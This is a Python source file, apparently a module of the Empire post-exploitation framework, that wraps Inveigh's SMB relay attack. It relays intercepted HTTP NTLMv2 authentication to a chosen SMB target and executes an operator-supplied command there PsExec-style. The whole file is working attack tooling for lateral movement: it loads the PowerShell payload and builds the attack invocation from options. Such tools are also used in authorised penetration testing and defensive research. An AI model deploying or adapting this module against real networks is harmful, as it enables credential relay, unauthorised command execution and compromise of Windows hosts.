from lib.common import helpers

class Module:

    def __init__(self, mainMenu, params=[]):

        self.info = {
            'Name': 'Invoke-InveighRelay',

            'Author': ['Kevin Robertson'],

            'Description': ('Inveigh\'s SMB relay function. This module can be used to relay '
                            'incoming HTTP NTLMv2 authentication requests to an SMB target. '
                            'If the authentication is successfully relayed and the account is '
                            'a local administrator, a specified command will be executed on the '
                            'target PSExec style. This module works best while also running '
                            'collection/inveigh with HTTP disabled.'),

            'Background' : True,

            'OutputExtension' : None,

            'NeedsAdmin' : True,

            'OpsecSafe' : False,

            'MinPSVersion' : '2',

            'Comments': [
                'https://github.com/Kevin-Robertson/Inveigh'
            ]
        }

        # any options needed by the module, settable during runtime
        self.options = {
            # format:
            #   value_name : {description, required, default_value}
            'Agent' : {
                'Description'     :   'Agent to run module on.',
                'Required'        :   True,
                'Value'           :   ''
            },
            'SMBRelayTarget' : {
                'Description'     :   'IP address of system to target for SMB relay.',
                'Required'        :   True,
                'Value'           :   ''
            },
            'SMBRelayCommand' : {
                'Description'     :   'Command to execute on SMB relay target. Do not wrap in quotes and use PowerShell character escapes where necessary.',
                'Required'        :   True,
                'Value'           :   ''
            },
            'SMBRelayUsernames' : {
                'Description'     :   'Comma separated list of usernames to use for relay attacks. Accepts both username and domain\username format.',
                'Required'        :   False,
                'Value'           :   ''
            },
            'SMBRelayAutoDisable' : {
                'Description'     :   'Enable/Disable automatically disabling SMB relay after a successful command execution on target (Y/N).',
                'Required'        :   False,
                'Value'           :   'Y'
            },
            'RunTime' : {
                'Description'     :   'Run time duration in minutes.',
                'Required'        :   False,
                'Value'           :   ''
            }
        }

        # save off a copy of the mainMenu object to access external functionality
        #   like listeners/agent handlers/etc.
        self.mainMenu = mainMenu

        for param in params:
            # parameter format is [Name, Value]
            option, value = param
            if option in self.options:
                self.options[option]['Value'] = value


    def generate(self):

        # read in the common module source code
        moduleSource = self.mainMenu.installPath + "/data/module_source/lateral_movement/Invoke-InveighRelay.ps1"

        try:
            f = open(moduleSource, 'r')
        except:
            print helpers.color("[!] Could not read module source path at: " + str(moduleSource))
            return ""

        moduleCode = f.read()
        f.close()

        script = moduleCode

        # set defaults for Empire
        script += "\n" + 'Invoke-InveighRelay -Tool "2" '

	for option,values in self.options.iteritems():
            if option.lower() != "agent":
                if values['Value'] and values['Value'] != '':
                    if values['Value'].lower() == "true":
                        # if we're just adding a switch
                        script += " -" + str(option)
                    else:
                        if "," in str(values['Value']):
                            quoted = '"' + str(values['Value']).replace(',', '","') + '"'
                            script += " -" + str(option) + " " + quoted
                        else:
                            script += " -" + str(option) + " \"" + str(values['Value']) + "\""

        return script
